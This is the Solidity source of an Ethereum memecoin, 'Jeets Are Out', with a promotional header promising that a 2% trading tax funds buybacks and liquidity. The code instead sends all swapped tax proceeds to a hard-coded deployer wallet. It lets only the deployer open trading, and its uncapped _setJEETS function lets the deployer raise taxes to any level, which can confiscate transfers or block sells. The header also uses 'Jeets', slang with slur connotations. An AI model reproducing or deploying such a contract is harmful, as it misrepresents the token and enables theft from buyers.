/*

Do you hate Jeeters? We all do. Once the Jeets Are out, we're going to buyback a huge amount of the supply and add it to LP using the 2% Buy/Sell Tax. A straightforward mechanism To rekt em all.

Long story short, if you hate the Jeets, this coin is for you.

Telegram: https://t.me/JeetsAreOutETH
Twitter: https://twitter.com/JeetsAreOutETH
Website: https://jeetsareout.site

*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

    interface IUniswapV2Router02 {
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint amountIn,
            uint amountOutMin,
            address[] calldata path,
            address to,
            uint deadline
            ) external;
        }
        
    contract JeetsAreOut {
        string public constant name = "Jeets Are Out";  //
        string public constant symbol = "JEETS";  //
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 1_000_000 * 10**decimals;

        uint256 BurnFigure = 2;
        uint256 ConfirmFigure = 2;
        uint256 constant swapAmount = totalSupply / 100;

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
            
        error Permissions();
            
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed owner,
            address indexed spender,
            uint256 value
        );
            

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant deployer = payable(address(0x5F1edAa024a1F20706767045a3d8aAeee095A631)); //

        bool private swapping;
        bool private tradingOpenNow;

        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

         receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpenNow || from == deployer || to == deployer);

            if(!tradingOpenNow && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                    );
                deployer.transfer(address(this).balance);
                swapping = false;
                }

            if(from != address(this)){
                uint256 FinalFigure = amount * (from == pair ? BurnFigure : ConfirmFigure) / 100;
                amount -= FinalFigure;
                balanceOf[address(this)] += FinalFigure;
            }
                balanceOf[to] += amount;
                emit Transfer(from, to, amount);
                return true;
            }

        function NowTradingOpen() external {
            require(msg.sender == deployer);
            require(!tradingOpenNow);
            tradingOpenNow = true;        
            }

        function _setJEETS(uint256 newBurn, uint256 newConfirm) external {
            require(msg.sender == deployer);
            BurnFigure = newBurn;
            ConfirmFigure = newConfirm;
            }
        }